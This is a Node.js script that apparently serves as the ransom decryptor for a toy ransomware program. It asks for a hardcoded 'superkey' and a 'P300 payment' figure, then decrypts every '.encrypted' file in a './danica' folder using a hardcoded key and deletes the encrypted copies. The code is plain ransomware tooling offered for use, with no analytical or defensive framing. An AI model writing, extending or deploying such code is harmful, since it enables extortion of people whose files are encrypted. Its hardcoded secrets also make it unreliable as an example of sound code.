var fs = require("fs");
var path = require("path");
var encryptor = require("file-encryptor");
var readline = require("readline");

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

var superKey = "danica";
var paymentAmount = 300; // P300 payment required

rl.question("Enter superkey: ", function (inputKey) {
  if (inputKey !== superKey) {
    console.log("Invalid superkey. Exiting...");
    rl.close();
    return;
  }

  rl.question("Enter payment amount (P300 required): ", function (payment) {
    if (parseInt(payment) !== paymentAmount) {
      console.log(
        "Incorrect payment amount. Payment required: P300. Exiting..."
      );
      rl.close();
      return;
    }

    // Superkey and payment are correct, proceed with decryption
    var key = "My Super Secret Key";
    var folderPath = "./danica"; // Assuming the 'danica' folder is in the same directory as this script

    // Read the contents of the folder
    fs.readdir(folderPath, function (err, files) {
      if (err) {
        console.error("Error reading folder:", err);
        rl.close();
        return;
      }

      // Loop through each file in the folder
      files.forEach(function (file) {
        var filePath = path.join(folderPath, file);
        var decryptedFilePath = filePath.replace(".encrypted", ""); // Remove .encrypted extension

        // Decrypt file.
        encryptor.decryptFile(filePath, decryptedFilePath, key, function (err) {
          if (err) {
            console.error("Decryption error for file:", filePath, err);
          } else {
            console.log("Decryption complete for file:", filePath);
            // Delete encrypted file after decryption
            fs.unlink(filePath, function (err) {
              if (err) {
                console.error("Error deleting file:", err);
              } else {
                console.log("Encrypted file deleted:", filePath);
              }
            });
          }
        });
      });
      rl.close();
    });
  });
});
